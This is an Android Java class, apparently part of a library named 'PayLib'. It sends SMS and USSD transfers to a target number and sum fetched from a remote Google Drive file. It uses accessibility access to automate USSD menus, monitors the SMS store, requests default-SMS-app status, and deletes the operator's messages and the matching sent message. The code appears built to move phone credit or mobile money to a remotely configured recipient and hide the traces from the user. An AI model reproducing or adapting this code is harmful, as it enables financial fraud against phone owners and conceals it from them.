package com.p2plib2;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import com.p2plib2.common.CommonFunctions;
import com.p2plib2.common.FilesLoader;
import com.p2plib2.operators.Operator;
import com.p2plib2.ussd.USSDController;
import com.google.gson.Gson;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static com.p2plib2.ussd.USSDController.verifyAccesibilityAccess;


public class PayLib implements PayInterface {
    private String version = "1.0.0";
    private String defaultSmsApp;
    private String pathOfFile = "web";
    private SharedPreferences operatorSettings;
    public static Operator operatorSMS;
    public static Operator operatorUssd;
    private HashMap<String, OperatorInfo> operatorInfo = new HashMap<>();
    private HashMap<String, String> filters = new HashMap<>();
    public static int simCounter = 0;
    public static CallSmsResult feedback;
    public static String operName = "";
    public static Context cnt;
    public static Activity act;
    public static Boolean flagok = false;
    public static Operation currentOperation;

    public static final String PREFERENCES = "operSetting";


    public static String getOperName() {
        return operName;
    }

    public static void getSMSResult(String smsBody) {
        Logger.lg("SmsBody from lib: " + smsBody);
        feedback.callResult("Code P2P-003: " + smsBody);
    }

    @Override
    public void updateData(Activity act, Context cnt, CallSmsResult feedback) {
        this.feedback = feedback;
        this.cnt = cnt;
        this.act = act;
        CommonFunctions.permissionCheck(cnt, act);
        USSDController.verifyAccesibilityAccess(act);
        verifyAccesibilityAccess(act);
        operatorSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
        /*Create necessary objects*/
        operName = CommonFunctions.operName(cnt);
        if (isSimAvailable(cnt)) {
            new DownloadApkTask().execute();
            MyContentObserver contentObserver = new MyContentObserver();
            ContentResolver contentResolver = cnt.getContentResolver();
            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, contentObserver);
        } else {
            feedback.callResult("Code P2P-013: no active sim-card ");
        }
    }

    public boolean isSimAvailable(Context cnt) {
        boolean isAvailable = false;
        TelephonyManager telMgr = (TelephonyManager) cnt.getSystemService(Context.TELEPHONY_SERVICE);
        int simState = telMgr.getSimState();
        Logger.lg(simState + " simState ");
        switch (simState) {
            case TelephonyManager.SIM_STATE_ABSENT: //SimState = “No Sim Found!”;
                break;
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED: //SimState = “Network Locked!”;
                break;
            case TelephonyManager.SIM_STATE_PIN_REQUIRED: //SimState = “PIN Required to access SIM!”;
                break;
            case TelephonyManager.SIM_STATE_PUK_REQUIRED: //SimState = “PUK Required to access SIM!”; // Personal Unblocking Code
                break;
            case TelephonyManager.SIM_STATE_READY:
                isAvailable = true;
                break;
            case TelephonyManager.SIM_STATE_UNKNOWN: //SimState = “Unknown SIM State!”;
                break;
        }
        return isAvailable;
    }


    public static String currentMsg = "";

    private class MyContentObserver extends ContentObserver {
        public MyContentObserver() {
            super(null);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse("content://sms/");
            Cursor cur = cnt.getContentResolver().query(uriSMSURI, null, null, null, null);
            if (cur.moveToNext()) {
                String message_id = cur.getString(cur.getColumnIndex("_id"));
                String type = cur.getString(cur.getColumnIndex("type"));
                String numeroTelephone = cur.getString(cur.getColumnIndex("address")).trim();
                String status = cur.getString(cur.getColumnIndex("status")).trim();
                String body = cur.getString(cur.getColumnIndex("body")).trim();
                //0: _id//1: thread_id//2: address//3: person//4: date//5: protocol
                //6: read//7: status//8: type//9: reply_path_present//10: subject
                //11: body//12: service_center//13: locked
                Logger.lg("message_id  " + message_id + " type " + type + " numeroTelephone " + numeroTelephone + " status " + status + " currentMsg  " + currentMsg
                        + " date " + cur.getString(cur.getColumnIndex("date")) + " body " + body);
                if ((status.equals("-1") || status == null) && !currentMsg.equals("")) {
//                    Logger.lg(currentMsg.substring(0, currentMsg.indexOf("[]")) + " num " +
//                            currentMsg.substring(0, currentMsg.indexOf("[]")).contains(numeroTelephone)
//                                   + " " +  CommonFunctions.formatOperMame(numeroTelephone).contains(operatorSMS.name)
//                             "  msg body " + currentMsg.substring(currentMsg.indexOf("[]") + 2).contains(body) + "  " + currentMsg.substring(currentMsg.indexOf("[]") + 2));
                    if ((currentMsg.substring(0, currentMsg.indexOf("[]")).contains(numeroTelephone)
                            || CommonFunctions.formatOperMame(numeroTelephone).contains(operatorSMS.name))
                            && currentMsg.substring(currentMsg.indexOf("[]") + 2).contains(body)) {
//                        Logger.lg("Code P2P-010: error SMS sending " + status + " from " + numeroTelephone);
                        feedback.callResult("Code P2P-010: error SMS sending " + status + " from " + numeroTelephone);
                    }
                } else if (!status.equals("-1") && status != null && !currentMsg.equals("")) {
                    if ((currentMsg.substring(0, currentMsg.indexOf("[]")).contains(numeroTelephone)
                            || CommonFunctions.formatOperMame(numeroTelephone).contains(operatorSMS.name))
                            && currentMsg.substring(currentMsg.indexOf("[]") + 2).contains(body)) {
                        feedback.callResult("Code P2P-012: success SMS sending " + status + " from " + numeroTelephone);
                    }
                }
            }
        }

        @Override
        public boolean deliverSelfNotifications() {
            return false;
        }
    }

    /***/
    private class DownloadApkTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        /**
         * TODO correct parsing by Json
         */
        @Override
        protected Void doInBackground(Void... params) {
            final FilesLoader load = new FilesLoader();
            //https://drive.google.com/open?id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v
            String input = load.downloadJson("https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download");
            pathOfFile = "web";
            if (input == null) {
                byte[] buffer = null;
                InputStream is;
                try {
                    is = cnt.getAssets().open("p2p_data.json");
                    buffer = new byte[is.available()];
                    is.read(buffer);
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                input = new String(buffer);
                pathOfFile = "local file";
            }
            SharedPreferences.Editor editor = operatorSettings.edit();
            editor.putString(PREFERENCES, input);
            editor.apply();
            Gson g = new Gson();
            OperatorList operator = g.fromJson(input, OperatorList.class);
            for (Object user : operator.operators) {
                Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
                String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
                OperatorInfo info = new OperatorInfo(
                        separated[0].substring(separated[0].indexOf("=") + 1),
                        separated[1].substring(separated[1].indexOf("=") + 1),
                        separated[2].substring(separated[2].indexOf("=") + 1),
                        separated[3].substring(separated[3].indexOf("=") + 1),
                        separated[4].substring(separated[4].indexOf("=") + 1));
                String opr = separated[0].substring(separated[0].indexOf("=") + 1);
                operatorInfo.put(opr.toUpperCase(), info);
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            setOperatorData(true, true);
        }
    }

    class OperatorList {
        ArrayList operators;
    }

    class OperatorInfo {
        String operator;
        String smsNum;
        String ussdNum;
        String target;
        String sum;

        public OperatorInfo(String s, String s1, String s2, String s3, String s4) {
            this.operator = s;
            this.smsNum = s1;
            this.ussdNum = s2;
            this.target = s3;
            this.sum = s4;
        }
    }

    @SuppressLint("MissingPermission")
    public int getSimCardNumByName(String operName) {
        int result = -1;
        final SubscriptionManager subscriptionManager;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            subscriptionManager = SubscriptionManager.from(cnt);
            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                String carrierName = CommonFunctions.formatOperMame(subscriptionInfo.getCarrierName().toString());
                Logger.lg("oper name " + operName + "  carrierName " + carrierName);
                if (carrierName.contains(operName)) {
                    result = subscriptionInfo.getSimSlotIndex();
                }
            }
        } else {
            feedback.callResult("Code P2P-011: current Android version does not support multy sim");
        }
        return result;
    }

    @SuppressLint("MissingPermission")
    public int getSubIdByName(String operName) {
        int result = -1;
        final SubscriptionManager subscriptionManager;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            subscriptionManager = SubscriptionManager.from(cnt);
            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                String carrierName = CommonFunctions.formatOperMame(subscriptionInfo.getCarrierName().toString());
                Logger.lg("oper name " + operName + "  carrierName " + carrierName);
                if (carrierName.contains(operName)) {
                    result = subscriptionInfo.getSubscriptionId();
                }
            }
        } else {
            feedback.callResult("Code P2P-011: current Android version does not support multy sim");
        }
        return result;
    }

    @SuppressLint("MissingPermission")
    public String getOperatorBySubId(int subscriptiond) {
        String result = "";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            final SubscriptionManager subscriptionManager = SubscriptionManager.from(cnt);
            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                int subId = subscriptionInfo.getSubscriptionId();
                Logger.lg("subscriptiond " + subscriptiond + " subId " + subId);
                if (subId == subscriptiond) {
                    result = CommonFunctions.formatOperMame(subscriptionInfo.getCarrierName().toString());
                }
            }
        } else {
            feedback.callResult("Code P2P-011: current Android version does not support multy sim");
        }
        return result;
    }

    @SuppressLint("MissingPermission")
    private String getOperatorBySimId(int which) {
        String result = "";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            final SubscriptionManager subscriptionManager = SubscriptionManager.from(cnt);
            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                int subId = subscriptionInfo.getSimSlotIndex();
                Logger.lg("getOperatorBySimId " + which + " subId " + subId);
                if (subId == which) {
                    result = CommonFunctions.formatOperMame(subscriptionInfo.getCarrierName().toString());
                }
            }
        } else {
            feedback.callResult("Code P2P-011: current Android version does not support multy sim");
        }
        return result;
    }

//    public boolean checkOperatorIsActive(Context cnt, TelephonyManager telephonyManager ){
//        Boolean result = false;
//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
//            final SubscriptionManager subscriptionManager = SubscriptionManager.from(cnt);
//            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
//            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
//                String nameOpera =  CommonFunctions.formatOperMame(subscriptionInfo.getCarrierName().toString());
//                if (nameOpera == CommonFunctions.operName(cnt)) {
//                    telephonyManager.getSimState(subscriptionInfo.getSimSlotIndex());
//                    Logger.lg(subscriptionInfo.getCarrierName() + " "+  telephonyManager.getSimState(subscriptionInfo.getSimSlotIndex()));
//                }
//            }
//        } else {
//            feedback.callResult("Code P2P-011: current Android version does not support multy sim");
//        }
//        return result;
//    }

    public void setOperatorData(Boolean sendWithSaveOutput, Boolean sendWithSaveInput) {
        operatorSMS = new Operator(CommonFunctions.operName(cnt), sendWithSaveOutput, sendWithSaveInput, cnt);
        operatorUssd = new Operator(CommonFunctions.operName(cnt), sendWithSaveOutput, sendWithSaveInput, cnt);
        TelephonyManager telephonyManager = (TelephonyManager) act.getSystemService(Context.TELEPHONY_SERVICE);
        SmsManager mgr = SmsManager.getDefault();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            simCounter = telephonyManager.getPhoneCount();
        } else {
            simCounter = 1;
        }
        if (simCounter == 1) {
            OperatorInfo info = operatorInfo.get(getOperName());
            operatorSMS.setData(info.smsNum, info.target, info.sum, info.ussdNum);
            operatorUssd = operatorSMS;
        } else {
            /***For sms operator*/
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                if (mgr.getSubscriptionId() >= 0) {
                    operatorSMS.name = getOperatorBySubId(mgr.getSubscriptionId());
                    if (operatorInfo.containsKey(operatorSMS.name)) {
                        OperatorInfo info = operatorInfo.get(operatorSMS.name);
                        operatorSMS.setData(info.smsNum, info.target, info.sum, info.ussdNum);
                        Operator.simNumSms = mgr.getSubscriptionId();
                        Logger.lg("Operator sms " + info.smsNum + " " + info.target + " " + info.sum + " " + info.ussdNum + " " + mgr.getSubscriptionId());
                    }
                } else {
                    feedback.callResult("Code: P2P-002. Run operatorChooser with parameter \"SMS\" for choosing simCard for sms requests");
                }
            } else {
                feedback.callResult("Code P2P-011: current Android version does not support multy sim");
            }
            /**For ussd operator**/
            if (operatorInfo.containsKey(operatorUssd.name)) {
                OperatorInfo info = operatorInfo.get(operatorUssd.name);
                operatorUssd.setData(info.smsNum, info.target, info.sum, info.ussdNum);
                Operator.simNumUssd = getSimCardNumByName(operatorUssd.name);
                Logger.lg("Operator ussd " + operatorUssd.name + " " + info.smsNum + " " + info.target + " " + info.sum + " " + info.ussdNum + " " + Operator.simNumUssd);
            }
        }
        feedback.callResult("Code P2P-001: Data has been updated");
    }

    /**
     * Reply answer code
     */
    public static void sendAnswer(String smsBody, String smsSender) {
        if (currentOperation.equals(Operation.USSD)) {
            operatorUssd.sendAnswer(smsBody, smsSender);
        }
        if (currentOperation.equals(Operation.SMS)) {
            operatorSMS.sendAnswer(smsBody, smsSender);
        }

    }


    public void sendSms(Boolean sendWithSaveOutput, Context cnt) {
        currentOperation = Operation.SMS;
        operatorSMS.sendWithSaveOutput = sendWithSaveOutput;
        operatorSMS.sendSMS(sendWithSaveOutput, cnt);
    }


    public void sendUssd(String operDestination, Activity act) {
        currentOperation = Operation.USSD;
        flagok = true;
        operatorUssd.sendUssd(operDestination, act);
    }


    @Override
    public String getVersion() {
        return version;
    }

    public void setFilter(HashMap<String, String> filters) {
        this.filters.putAll(filters);
    }

    /**
     * sendWithSaveOutput - for sms
     * operDestination - for ussd
     */
    @Override
    public void operation(String operType, Boolean sendWithSaveOutput,
                          Activity act, Context cnt, String operDestination, String phoneNum) {
      //  updateData();
        switch (operType) {
            case "sms":
                if (phoneNum != null) {
                    operatorSMS.target = phoneNum;
                }
                sendSms(sendWithSaveOutput, cnt);
                break;
            case "ussd":
                if (phoneNum != null) {
                    operatorUssd.target = phoneNum;
                    Logger.lg("phoneNum " + phoneNum);
                    operatorUssd.sendWithSaveOutput = sendWithSaveOutput;
                }
                sendUssd(operDestination, act);
                break;
        }
    }

    /**
     * param 0 - operator massive, 1 - dialog
     */
    @SuppressLint("MissingPermission")
    @Override
    public String[] operatorChooser(Context cnt, final String operation, int param) {
        AlertDialog.Builder builder = new AlertDialog.Builder(cnt);
        builder.setTitle("Choose sim card for operation " + operation);
        if (simCounter == 0) {
            TelephonyManager telephonyManager = (TelephonyManager) act.getSystemService(Context.TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                simCounter = telephonyManager.getPhoneCount();
            }
        }
        final String[] mass = new String[simCounter];
        final SubscriptionManager subscriptionManager;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            subscriptionManager = SubscriptionManager.from(cnt);
            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            Logger.lg("activeSubscriptionInfoList  " + activeSubscriptionInfoList.size());
            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                final CharSequence carrierName = subscriptionInfo.getCarrierName();
                final Integer simId = subscriptionInfo.getSimSlotIndex();
                Logger.lg(carrierName + " sim card " + simId);
                if (operatorInfo.containsKey(CommonFunctions.formatOperMame(carrierName.toString()))) {
                    mass[simId] = carrierName.toString();
                } else {
                    Logger.lg("This operator is unknown");
                }
            }
            if (param == 1) {
                builder.setItems(mass, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        if (Operation.SMS.toString().equals(operation)) {
                            Operator.simNumSms = which;
                        }
                        if (Operation.USSD.toString().equals(operation)) {
                            Operator.simNumUssd = which;
                        }
                        updateOperator(which, operation);
                        Logger.lg("for operation " + operation + " choose sim-card " + which);
                    }
                });
                builder.show();
            }
        } else {
            feedback.callResult("Code P2P-011: current Android version does not support multy sim");
        }
        return mass;
    }

    private void updateOperator(int which, String operation) {
        String name = getOperatorBySimId(which);
        Logger.lg("Choose sim " + which + " for operation " + operation + " operName " + name);
        OperatorInfo info = null;
        if (operatorInfo.containsKey(name)) {
            info = operatorInfo.get(name);
        }
        if (Operation.SMS.toString().equals(operation)) {
            operatorSMS.name = name;
            Logger.lg("name  " + info.operator + " " + info.smsNum + " " + info.target + " " + info.sum + " " + info.ussdNum);
            operatorSMS.setData(info.smsNum, info.target, info.sum, info.ussdNum);
            Operator.simNumSms = getSubIdByName(operatorSMS.name);
        }
        if (Operation.USSD.toString().equals(operation)) {
            operatorUssd.name = name;
            operatorUssd.setData(info.smsNum, info.target, info.sum, info.ussdNum);
            Operator.simNumUssd = getSimCardNumByName(operatorUssd.name);
        }
    }


    public void checkSmsDefaultApp(boolean deleteFlag, Integer code) {
        final String myPackageName = cnt.getPackageName();
        defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(cnt);
        Logger.lg(deleteFlag + " MyPackageName  " + myPackageName + "  defaultSmsApp now " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
        if (!myPackageName.equals(defaultSmsApp) && deleteFlag == true) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            act.startActivityForResult(intent, code);
        } else {
            Intent intent2 = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            act.startActivityForResult(intent2, code);
        }
    }

    @Override
    public void deleteSMS(HashMap<String, String> filters, Context cnt) {
        Uri uriSms = Uri.parse("content://sms");
        Cursor c = cnt.getContentResolver().query(
                uriSms, null, null, null, null);
        Logger.lg("SMS in inbox: " + c.getCount());
        int flag = 0;
        int flag2 = 0;
        if (c != null && c.moveToFirst()) {
            do {
                long id = c.getLong(0);
                long threadId = c.getLong(1);
                String address = c.getString(2);
                String body = c.getString(c.getColumnIndex("body"));
                String date = c.getString(3);
                Logger.lg("Message  " + body + " id " + id + " date " + date + " " + address);
                if (address != null) {
                    if ((operatorSMS.smsNum.contains(address) || address.toUpperCase().equals(operatorSMS.name)) && flag < 2) {
                        int iko = cnt.getContentResolver().delete(
                                Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                        if (iko != 0) {
                            flag++;
                        }
                        Logger.lg("Delete result " + iko);
                    }
//                Logger.lg(currentMsg + " " + address + " " +
//                        " " + currentMsg.substring(currentMsg.indexOf("[]") + 2) +
//                        body + " " + currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) + " " + body.contains(currentMsg.substring(currentMsg.indexOf("[]") + 2)));
                    boolean flagFilters = true;
                    if (!filters.isEmpty()) {
                        for (Map.Entry<String, String> filter : filters.entrySet()) {
                            int index = c.getColumnIndex(filter.getKey());
                            if (index != -1) {
                                if (!c.getString(index).contains(filter.getValue())) {
                                    flagFilters = false;
                                }
                            }
                        }
                    }

                    if (flagFilters && currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) && body.contains(currentMsg.substring(currentMsg.indexOf("[]") + 2))
                            && flag2 == 0) {
                        flag2 = cnt.getContentResolver().delete(
                                Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                        Logger.lg("deltete " + flag2);
                    }
                }
            } while (c.moveToNext());
        }
        feedback.callResult("Code P2P-005: delete " + flag + " sms in inbox and " + flag2 + " in outbox");
    }

    public enum Operation {
        SMS, USSD
    }
}